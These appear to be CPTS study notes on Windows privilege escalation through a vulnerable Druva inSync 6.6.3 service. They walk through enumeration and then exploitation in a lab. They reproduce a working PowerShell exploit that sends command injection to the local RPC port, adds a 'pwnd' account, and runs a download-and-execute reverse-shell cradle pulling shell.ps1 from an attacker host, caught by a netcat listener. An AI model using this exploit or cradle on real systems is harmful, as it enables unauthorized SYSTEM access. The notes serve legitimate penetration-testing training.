This section covers a very practical Windows privilege-escalation scenario: **a vulnerable third-party application/service can provide SYSTEM even when Windows itself is fully patched and the machine is otherwise well configured**.

The key lesson is:

> **Don't only enumerate Windows. Enumerate the software installed on Windows.**

A vulnerable application may expose a local service, RPC interface, or other attack surface that runs as `NT AUTHORITY\SYSTEM`. The source also emphasizes that vulnerable services don't always give SYSTEM—some may instead expose sensitive configuration data or cause denial of service.

---

# 1. Core Concept

Your previous sections focused heavily on:

```text
Windows misconfiguration
        ↓
Weak permissions
        ↓
SYSTEM
```

This section adds another path:

```text
Installed software
       ↓
Third-party application
       ↓
Vulnerable service/interface
       ↓
Exploit
       ↓
SYSTEM
```

### CPTS mental model

```text
Low-privileged foothold
        │
        ▼
Enumerate installed software
        │
        ▼
Identify unusual application
        │
        ▼
Determine version
        │
        ▼
Research known vulnerability
        │
        ▼
Find application's local service
        │
        ▼
Map port → PID → process → service
        │
        ▼
Exploit vulnerable interface
        │
        ▼
SYSTEM
```

---

# 2. Step 1 — Enumerate Installed Programs

The source begins with:

```cmd
wmic product get name
```

Example:

```text
Microsoft Visual C++ 2019 X64 Minimum Runtime
VMware Tools
Druva inSync 6.6.3
Microsoft Update Health Tools
...
```

The important entry is:

```text
Druva inSync 6.6.3
```

Why?

Because unlike the normal Windows components, this is a **third-party application with a specific version number**.

### CPTS takeaway

When you see:

```text
Application Name + Version
```

think:

```text
Does this exact version have known vulnerabilities?
```

---

# 3. Why Version Numbers Matter

Don't just record:

```text
Druva inSync
```

Record:

```text
Druva inSync 6.6.3
```

Because vulnerabilities are often version-specific.

Your workflow should be:

```text
Application
     ↓
Version
     ↓
Known CVEs / PoCs
     ↓
Affected?
     ↓
Exploit conditions
```

In this source's example, version `6.6.3` is identified as vulnerable to command injection through an exposed RPC service.

The application also runs a service under:

```text
NT AUTHORITY\SYSTEM
```

That makes the vulnerability particularly interesting for local privilege escalation.

---

# 4. Enumerating Local Ports

Once you know an application is installed, find out whether it exposes a local network service.

The source uses:

```cmd
netstat -ano | findstr 6064
```

Example:

```text
TCP    127.0.0.1:6064    0.0.0.0:0    LISTENING    3324
```

The important pieces are:

```text
127.0.0.1:6064
       │
       ├── Port: 6064
       │
       └── PID: 3324
```

---

# 5. Why `127.0.0.1` Is Interesting

Notice:

```text
127.0.0.1:6064
```

rather than:

```text
0.0.0.0:6064
```

This means the service is listening locally.

You can't necessarily connect to it directly from your Kali machine, but **a shell already running on the Windows target can communicate with it**.

That's a very important CPTS concept.

```text
External attacker
       X
       │
       │ port 6064 not externally exposed
       │
       ▼
Windows target
       │
       ▼
127.0.0.1:6064
       │
       ▼
Vulnerable service
```

### Therefore:

**"Not externally exposed" does not mean "not exploitable."**

If you've already obtained a foothold, localhost services become part of your attack surface.

---

# 6. PID → Process Mapping

`netstat` gave us:

```text
PID = 3324
```

Now identify the process.

The source uses PowerShell:

```powershell
Get-Process -Id 3324
```

Result:

```text
ProcessName
-----------
inSyncCPHwnet64
```

Now we have:

```text
Port 6064
     ↓
PID 3324
     ↓
inSyncCPHwnet64
     ↓
Druva inSync
```

This is an extremely useful enumeration technique.

---

# 7. The Windows Network Enumeration Chain

Memorize this:

```text
Port
 ↓
PID
 ↓
Process
 ↓
Service
 ↓
Application
 ↓
Version
 ↓
Vulnerability
```

For this example:

```text
6064
 ↓
3324
 ↓
inSyncCPHwnet64
 ↓
Druva inSync Client Service
 ↓
Druva inSync 6.6.3
 ↓
Known vulnerability
```

This is exactly the kind of reasoning you need rather than randomly running exploits.

---

# 8. Confirm the Service

The source uses:

```powershell
Get-Service | ? {$_.DisplayName -like 'Druva*'}
```

Output:

```text
Status   Name               DisplayName
------   ----               -----------
Running  inSyncCPHService   Druva inSync Client Service
```

Now we have three independent pieces of evidence:

```text
Installed software
       +
Listening port
       +
Running service
```

That gives much higher confidence that the vulnerable component is actually active.

---

# 9. Full Enumeration Process

For a suspicious third-party application:

```text
1. Is it installed?
        ↓
2. What version?
        ↓
3. Is it running?
        ↓
4. What ports does it expose?
        ↓
5. Which PID owns the port?
        ↓
6. Which process owns the PID?
        ↓
7. Which Windows service is associated?
        ↓
8. Which account runs the service?
        ↓
9. Is that version vulnerable?
        ↓
10. Can the vulnerability be triggered locally?
```

---

# 10. Druva inSync Vulnerability

The source's example involves:

```text
Druva inSync 6.6.3
```

and a vulnerable RPC interface exposed on:

```text
127.0.0.1:6064
```

The vulnerable service runs under:

```text
NT AUTHORITY\SYSTEM
```

The exploit therefore has an important chain:

```text
Low privilege
     ↓
Connect to localhost:6064
     ↓
Interact with vulnerable RPC service
     ↓
Command injection
     ↓
Command executes as service account
     ↓
SYSTEM
```

---

# 11. Understanding the PoC

The source's PoC begins with:

```powershell
$ErrorActionPreference = "Stop"
```

This tells PowerShell to stop when an error occurs.

Then:

```powershell
$cmd = "net user pwnd /add"
```

This is the command the vulnerable service will ultimately execute.

### Important:

The exploit itself is not necessarily tied to:

```text
net user pwnd /add
```

That is simply the **command chosen for the demonstration**.

The important variable is:

```powershell
$cmd
```

The source explicitly modifies this variable for the reverse-shell demonstration.

---

# 12. Creating the TCP Socket

The PoC creates a .NET TCP socket:

```powershell
$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)
```

Conceptually:

```text
PowerShell
    ↓
Create TCP socket
    ↓
Connect to 127.0.0.1
    ↓
Port 6064
```

Then:

```powershell
$s.Connect("127.0.0.1", 6064)
```

---

# 13. RPC Request Structure

The PoC constructs several pieces of data:

```powershell
$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
```

Then:

```powershell
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
```

Then the command:

```powershell
$command = [System.Text.Encoding]::Unicode.GetBytes(
"C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd"
)
```

And finally:

```powershell
$length = [System.BitConverter]::GetBytes($command.Length)
```

The pieces are sent through the socket:

```powershell
$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)
```

### Mental model

```text
Header
  +
RPC type
  +
Command length
  +
Command
  ↓
TCP connection
  ↓
127.0.0.1:6064
  ↓
Druva RPC service
```

---

# 14. Why the `cmd.exe` Path Is Interesting

The PoC constructs:

```text
C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe
```

The important idea is the use of:

```text
..\..\..
```

to traverse directories and reach:

```text
Windows\System32\cmd.exe
```

So conceptually:

```text
C:\ProgramData\Druva\inSync4
        ↓
      ..
        ↓
      ..
        ↓
      ..
        ↓
C:\Windows\System32\cmd.exe
```

Then:

```text
cmd.exe /c <command>
```

executes the supplied command.

---

# 15. Changing the Command

The source initially uses:

```powershell
$cmd = "net user pwnd /add"
```

But creating an account is noisy.

Instead, the source demonstrates obtaining a reverse shell.

The command becomes:

```powershell
$cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.14.3:8080/shell.ps1')"
```

Conceptually:

```text
Druva service
      ↓
cmd.exe
      ↓
PowerShell
      ↓
Download shell.ps1
      ↓
Execute PowerShell reverse shell
      ↓
Attacker
```

---

# 16. Hosting the PowerShell Payload

The source uses a Python HTTP server:

```bash
python3 -m http.server 8080
```

The target then requests:

```text
http://10.10.14.3:8080/shell.ps1
```

So there are two separate network connections:

```text
TARGET ─────HTTP─────> KALI
        shell.ps1

TARGET <────TCP────── KALI
        reverse shell
```

This distinction is useful when troubleshooting.

---

# 17. Reverse Shell Listener

The source uses:

```bash
nc -lvnp 9443
```

Meaning:

```text
-l    listen
-v    verbose
-n    don't resolve DNS
-p    port
```

So:

```text
Kali
 ↓
TCP 9443
 ↓
Netcat listener
```

When the SYSTEM PowerShell process connects back:

```text
connect to [10.10.14.3] from [10.129.43.7]
```

you receive the shell.

---

# 18. Confirm the Privilege Level

Never assume your exploit worked.

Immediately run:

```powershell
whoami
```

The source gets:

```text
nt authority\system
```

Then:

```powershell
hostname
```

to confirm the target machine.

The demonstrated result is:

```text
WINLPE-WS01
```

---

# 🔥 The Complete Vulnerable-Service Attack Chain

This is the most important diagram from this section:

```text
                LOW-PRIV SHELL
                     │
                     ▼
          Enumerate installed programs
                     │
                     ▼
             Find Druva inSync
                     │
                     ▼
              Version = 6.6.3
                     │
                     ▼
          Research known vulnerability
                     │
                     ▼
        Enumerate localhost ports
                     │
                     ▼
              127.0.0.1:6064
                     │
                     ▼
                  PID 3324
                     │
                     ▼
            inSyncCPHwnet64
                     │
                     ▼
         Druva inSync Client Service
                     │
                     ▼
             Runs as SYSTEM
                     │
                     ▼
             Vulnerable RPC
                     │
                     ▼
             Command Injection
                     │
                     ▼
               cmd.exe /c
                     │
                     ▼
             PowerShell payload
                     │
                     ▼
               SYSTEM SHELL
```

---

# 🧠 What Makes This Different From Weak Permissions?

Compare your previous section with this one.

### Weak service permissions

```text
Service
   ↓
Weak ACL
   ↓
Modify service configuration
   ↓
SYSTEM
```

### Vulnerable service

```text
Service
   ↓
Vulnerable application code
   ↓
Exploit exposed interface
   ↓
SYSTEM
```

### Kernel exploit

```text
Windows
   ↓
Unpatched vulnerability
   ↓
Exploit kernel/component
   ↓
SYSTEM
```

So during CPTS enumeration you should consider **all three**.

---

# ⚡ CPTS Enumeration Checklist

After obtaining a Windows foothold:

### 1. Installed software

```cmd
wmic product get name
```

Look for:

```text
Third-party applications
Version numbers
Security software
Backup software
VPN software
Remote-management software
Monitoring agents
```

---

### 2. Network services

```cmd
netstat -ano
```

or:

```cmd
netstat -ano | findstr <port>
```

Look especially for:

```text
127.0.0.1:<port>
```

because localhost-only services can still be exploited **from your foothold**.

---

### 3. Map port → PID

```powershell
Get-Process -Id <PID>
```

---

### 4. Enumerate services

```powershell
Get-Service
```

Or filter:

```powershell
Get-Service | ? {$_.DisplayName -like 'Druva*'}
```

---

### 5. Determine service account

For a specific service:

```cmd
sc qc <ServiceName>
```

Look for:

```text
SERVICE_START_NAME
```

If you see:

```text
NT AUTHORITY\SYSTEM
```

the service becomes especially interesting.

---

# 🎯 The CPTS Rule

When you see an unfamiliar application, **don't ignore it because Windows itself appears fully patched**.

Use:

```text
Installed software
       ↓
Version
       ↓
Running process
       ↓
Listening ports
       ↓
Service
       ↓
Service account
       ↓
Known vulnerability
       ↓
Exploitability
```

The source's main lesson is exactly this: organizations should restrict unnecessary local administrator rights and use application-whitelisting controls so that unvetted third-party software cannot introduce these attack paths.

---

# 🔥 What I Want You to Memorize

```text
wmic product get name
```

**→ What software is installed?**

```text
netstat -ano
```

**→ What ports/services are listening?**

```powershell
Get-Process -Id <PID>
```

**→ Which process owns the port?**

```powershell
Get-Service
```

**→ Which Windows service is involved?**

```cmd
sc qc <service>
```

**→ Who runs the service?**

Then ask:

> **Is this exact software version vulnerable, and can I reach its vulnerable interface from my current foothold?**

That question is the heart of this entire **Vulnerable Services** section.